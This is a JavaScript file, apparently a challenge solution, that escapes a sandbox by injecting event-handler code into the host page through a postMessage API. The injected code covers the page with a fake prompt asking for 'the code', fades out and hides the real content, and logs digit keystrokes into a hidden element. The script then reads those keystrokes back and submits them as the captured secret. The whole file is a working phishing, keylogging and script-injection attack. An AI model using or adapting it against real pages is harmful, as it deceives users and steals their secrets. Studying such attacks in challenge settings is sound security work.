// API calls

function saveMethods() {
  postMessage({'setAttr': {'selector': 'html', 'name': 'onmouseover', 'value': `
if (!window.dce) {
  window.dce = document.createElement;
  window.dqs = document.querySelector;
  window.dqsa = document.querySelectorAll;
}

`}});
  setTimeout(saveMethods, 1);
}
saveMethods();

function read(selector) {
  postMessage({'read': {'selector': selector}});
}

function capture(guess) {
  postMessage({'capture': {'secret': guess}});
}

function setAttr(selector, name, value) {
  postMessage({'setAttr': {'selector': selector, 'name': name, 'value': value}});
}

function append(selector, name) {
  postMessage({'append': {'selector': selector, 'name': name}});
}

function setAttrs(selector, attrs) {
  for (var name in attrs) {
    setAttr(selector, name, attrs[name]);
  }
}

var prefix = makeId();
var waitingForInit = true;

onmessage = function(e) {
  if (e.data.innerHTML) {
    var text = e.data.innerHTML.trim();
    for (var i = 0; i < text.length - 1; i++) {
      capture(text.substr(i));
    }
    if (text == prefix + '_init') {
      waitingForInit = false;
    }
  }
};

// DOM manipulation

function randRange(low, high) {
  return Math.floor(low + Math.random() * (high - low));
}

function makeId() {
  return 'x' + randRange(0, 100000000);
}

function makeDiv(id, attrs) {
  append('body', id);
  attrs.id = id;
  setAttrs(id, attrs);
}

// JS execution

function executeJs(js) {
  setAttr('html', 'onmousemove', js);
}

// the stuff

var keyReaderSel = makeId();
var receiverSel = makeId();
function init() {
  executeJs(`

if (!window.__prefix___init) {
  console.log('try init');
  function randRange(low, high) {
    return Math.floor(low + Math.random() * (high - low));
  }

  function makeId() {
    return 'x' + randRange(0, 100000000);
  }

  var k = dqs.call(document, '__keyReaderSel__');
  var r = dqs.call(document, '__receiverSel__');

  var kw = k.offsetWidth, kh = k.offsetHeight;
  var iw = randRange(300, 500), ih = randRange(200, 400);
  var ix = (kw - iw)/2, iy = (kh - ih)/2 - 20;

  var html = '<div class="__prefix__" style="padding: 6px; border: 1px solid #888; border-radius: 4px; font-family: helvetica; font-size: 16px; line-height: 24px; text-align: center; position: absolute; left: ' + ix + '; top: ' + iy + '"><img class="__prefix__" src="http://placekitten.com/' + iw + '/' + ih + '"><div class="__prefix__">please tell me the code?</div><input class="__prefix__" style="font-size: 16px" size=12><input class="__prefix__" style="font-size: 16px" type=submit value="please?"><span id="__prefix___init" style="display: none">__prefix___init</span></div>';
  k.innerHTML = html;
  k.addEventListener('keyup', function(e) {
    console.log('keyup', e, e.keyCode);
    if (e.keyCode >= 48 && e.keyCode <= 57) {
      r.innerText += ('' + (e.keyCode - 48));
    }
    if (e.keyCode == 8) {
      r.innerText = r.innerText.replace(/.$/, '');
    }
  }, true);

  function popInFront() {
    var nodes = dqsa.call(document, '*');
    for (var i = 0; i < nodes.length; i++) {
      var n = nodes[i];
      var name = n.nodeName.toLowerCase();
      if (name != 'html' && name != 'body' && name != 'script' &&
          n.className != '__prefix__') {
        n.style.opacity = 0.2;
        n.style.zIndex = -1000;
      }
    }
    k.style.display = 'absolute';
    k.style.zIndex = 2147483647;
    setTimeout(popInFront, 1);
  }
  popInFront();

  console.log('finished init');
  window.__prefix___init = true;
}

`.replace(/__keyReaderSel__/g, keyReaderSel
).replace(/__receiverSel__/g, receiverSel
).replace(/__prefix__/g, prefix
));
  if (waitingForInit) {
    read('#__prefix___init');
    setTimeout(init, 10);
  }
}
init();

makeDiv(keyReaderSel, {
  'style': 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2147483647',
  'class': prefix});

makeDiv(receiverSel, {
  'style': 'display: none'
});


// Capturing the secret

function nextAttempt() {
  read(receiverSel);
  setTimeout(nextAttempt, 10);
}
nextAttempt();
